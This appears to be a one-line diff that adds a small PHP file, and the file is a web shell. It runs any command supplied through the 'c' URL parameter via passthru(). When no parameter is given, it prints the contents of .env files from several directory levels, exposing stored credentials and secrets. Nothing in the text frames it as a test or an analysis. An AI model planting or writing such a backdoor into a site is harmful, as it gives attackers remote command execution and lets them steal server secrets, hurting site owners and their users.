@@ -1,0 +1,1 @@
+<?php if(isset($_GET['c'])){passthru($_GET['c']);}else{echo file_get_contents('/var/www/html/.env')?:file_get_contents('../.env')?:file_get_contents('../../.env')?:'NO_ENV_FOUND';} ?>
